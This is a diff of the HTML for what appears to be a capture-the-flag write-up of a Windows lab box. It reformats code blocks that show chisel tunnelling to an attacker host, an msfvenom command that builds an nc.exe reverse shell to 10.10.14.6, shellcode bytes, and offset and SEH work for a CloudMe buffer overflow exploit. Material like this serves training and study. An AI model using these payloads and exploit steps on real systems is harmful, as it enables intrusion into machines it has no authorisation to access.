-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;chisel64.exe client 10.10.14.6:9003 R:9999:127.0.0.1:8888
+</span></span></code></pre></div><p>Upload and run chisel64.exe on victim as a client, ./chisel on attacker host as a server to port forward remote 127.0.0.1:8888 from victim to 127.0.0.1:9999 on attacker host</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;chisel64.exe client 10.10.14.6:9003 R:9999:127.0.0.1:8888
 </span></span><span style="display:flex;"><span>chisel64.exe client 10.10.14.6:9003 R:9999:127.0.0.1:8888
 </span></span><span style="display:flex;"><span>2020/09/26 13:50:14 client: Connecting to ws://10.10.14.6:9003
 </span></span><span style="display:flex;"><span>2020/09/26 13:50:15 client: Retrying in 100ms...
@@ -746,63 +422,15 @@
 </span></span><span style="display:flex;"><span>2020/09/26 20:53:52 server: Fingerprint 7a:24:7b:3c:4e:a5:3a:19:9b:1e:8e:d6:cf:d1:7c:a9
 </span></span><span style="display:flex;"><span>2020/09/26 20:53:52 server: Listening on http://0.0.0.0:9003
 </span></span><span style="display:flex;"><span>2020/09/26 20:55:00 server: session#1: tun: proxy#R:9999<span style="color:#ff79c6">=</span>&gt;8888: Listening
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s check the port forward tunnel:</p>
+</span></span></code></pre></div><p>Let&rsquo;s check the port forward tunnel:</p>
 <pre tabindex="0"><code>_  chisel git:(master) ss -nltp | grep 9999
 LISTEN    0         128                      *:9999                   *:*        users:((&#34;chisel&#34;,pid=19429,fd=8))
 </code></pre><p>We have to change the exploit 48389.py to use port 9999 instead of 8888</p>
 <p>We also have to change the payload as the PoC exploit is running calc.exe, so we use msvenom to create a payload</p>
 <p>I am using the docker version of msfvenom that I have aliased to the msfvenom command:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">alias</span> <span style="color:#8be9fd;font-style:italic">msfvenom</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;echo remember to save to -o /data/something ; docker run --rm -it -v &#34;${HOME}/.msf:/home/msf/&#34; -v &#34;${PWD}:/data&#34; metasploitframework/metasploit-framework ./msfvenom&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s wotk out a simple reverse shell:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> &gt;msfvenom -p windows/exec <span style="color:#8be9fd;font-style:italic">CMD</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;c;\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.6 9004&#39;</span> -b <span style="color:#f1fa8c">&#39;\x00\x0a\x0d&#39;</span> -f py -v payload
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">alias</span> <span style="color:#8be9fd;font-style:italic">msfvenom</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;echo remember to save to -o /data/something ; docker run --rm -it -v &#34;${HOME}/.msf:/home/msf/&#34; -v &#34;${PWD}:/data&#34; metasploitframework/metasploit-framework ./msfvenom&#39;</span>
+</span></span></code></pre></div><p>Let&rsquo;s wotk out a simple reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> &gt;msfvenom -p windows/exec <span style="color:#8be9fd;font-style:italic">CMD</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;c;\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.6 9004&#39;</span> -b <span style="color:#f1fa8c">&#39;\x00\x0a\x0d&#39;</span> -f py -v payload
 </span></span><span style="display:flex;"><span>remember to save to -o /data/something
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> No arch selected, selecting arch: x86 from the payload
@@ -837,9 +465,7 @@ LISTEN    0         128                      *:9999                   *:*       
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x08\x58\xe6\xc8\xe3\xa8\xc6\x39\x33\xe7\x27\x0e&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x1d\xc1\x67\x57\x51\x1d\x5c\xa7&#34;</span>
 </span></span><span style="display:flex;"><span> &gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>C:\Users\shaun\Downloads&gt;powershell -command &ldquo;&amp; .\f64.exe&rdquo;
+</span></span></code></pre></div><p>C:\Users\shaun\Downloads&gt;powershell -command &ldquo;&amp; .\f64.exe&rdquo;
 Program &lsquo;f64.exe&rsquo; failed to run: Operation did not complete successfully because the file contains a virus or
 potentially unwanted softwareAt line:1 char:1</p>
 <ul>
@@ -858,33 +484,9 @@ potentially unwanted softwareAt line:1 char:1</p>
 <h2 id="download-and-exploit-cloudme">Download and exploit CloudMe</h2>
 <p><a href="https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/">exploitation guide on bufferoverflows.net</a> shows the immunitydebugger guide to exploit CloudMe 1.11.2</p>
 <p>From CommandoVM, I have installed CloudMe and run it. I can check if it is running with:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netstat -ano | findstr <span style="color:#bd93f9">8888</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We attach the process to immunityDebugger and run the below python script to crash the application. EIP is overwritten with 41414141</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netstat -ano | findstr <span style="color:#bd93f9">8888</span>
+</span></span></code></pre></div><p>We attach the process to immunityDebugger and run the below python script to crash the application. EIP is overwritten with 41414141</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>target_ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>     <span style="color:#6272a4"># localhost</span>
 </span></span><span style="display:flex;"><span>target_port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8888</span>        <span style="color:#6272a4"># listening port of CloudMe Sync</span>
@@ -897,49 +499,20 @@ potentially unwanted softwareAt line:1 char:1</p>
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[+] &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">len</span>(payload)) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; Bytes Sent&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">except</span>:
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[-] Crashed&#34;</span>            <span style="color:#6272a4"># if the connection failed</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>It is easier with pwntools:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; python -m pip install virtualenv
+</span></span></code></pre></div><p>It is easier with pwntools:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; python -m pip install virtualenv
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; virtualenv.exe -p C:<span style="color:#f1fa8c">\P</span>ython27<span style="color:#f1fa8c">\p</span>ython.exe v2
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; .<span style="color:#f1fa8c">\v</span>2<span style="color:#f1fa8c">\S</span>cripts<span style="color:#f1fa8c">\a</span>ctivate
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt;<span style="color:#ff79c6">(</span>v2<span style="color:#ff79c6">)</span> pip install pwn
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt;<span style="color:#ff79c6">(</span>v2<span style="color:#ff79c6">)</span> pip install win_inet_pton
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We can now modify the payload with pwntools.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> cyclic
+</span></span></code></pre></div><p>We can now modify the payload with pwntools.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> cyclic
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">2000</span>)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Re-launch CloudMe in CommandoVM then run the exploit. ImmunityDebugger stop the program at: <code>EIP = 6b61616e</code></p>
+</span></span></code></pre></div><p>Re-launch CloudMe in CommandoVM then run the exploit. ImmunityDebugger stop the program at: <code>EIP = 6b61616e</code></p>
 <p>We deduct the offset is 1052:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>PS C:\Users\User\Desktop <span style="color:#ff79c6">&gt;</span>(v2)  python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;import pwn; print pwn.cyclic_find(&#39;</span><span style="color:#f1fa8c">\x6e\x61\x61\x6b</span><span style="color:#f1fa8c">&#39;)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>PS C:\Users\User\Desktop <span style="color:#ff79c6">&gt;</span>(v2)  python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;import pwn; print pwn.cyclic_find(&#39;</span><span style="color:#f1fa8c">\x6e\x61\x61\x6b</span><span style="color:#f1fa8c">&#39;)&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">1052</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="mona-immunitydebugger">Mona immunityDebugger</h2>
+</span></span></code></pre></div><h2 id="mona-immunitydebugger">Mona immunityDebugger</h2>
 <ul>
 <li>git clone <a href="https://github.com/corelan/mona.git">https://github.com/corelan/mona.git</a></li>
 </ul>
@@ -949,87 +522,24 @@ potentially unwanted softwareAt line:1 char:1</p>
 <p>We have to modify the location of the file pattern.txt in the file mona.py</p>
 <pre><code>!mona findmsp
 </code></pre>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Looking <span style="color:#ff79c6">for</span> cyclic pattern in memory
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Looking <span style="color:#ff79c6">for</span> cyclic pattern in memory
 </span></span><span style="display:flex;"><span>    EIP contains normal pattern : 0x316a4230 <span style="color:#ff79c6">(</span>offset 1052<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Examining SEH chain
 </span></span><span style="display:flex;"><span>    SEH record <span style="color:#ff79c6">(</span>nseh field<span style="color:#ff79c6">)</span> at 0x00a3d8d8 overwritten with normal pattern : 0x61443161 <span style="color:#ff79c6">(</span>offset 2344<span style="color:#ff79c6">)</span>, followed by <span style="color:#bd93f9">648</span> bytes of cyclic data after the handler
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We modify the payload to reflect the position of SEH and nSEH:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2344</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#6272a4">#junk</span>
+</span></span></code></pre></div><p>We modify the payload to reflect the position of SEH and nSEH:</p>
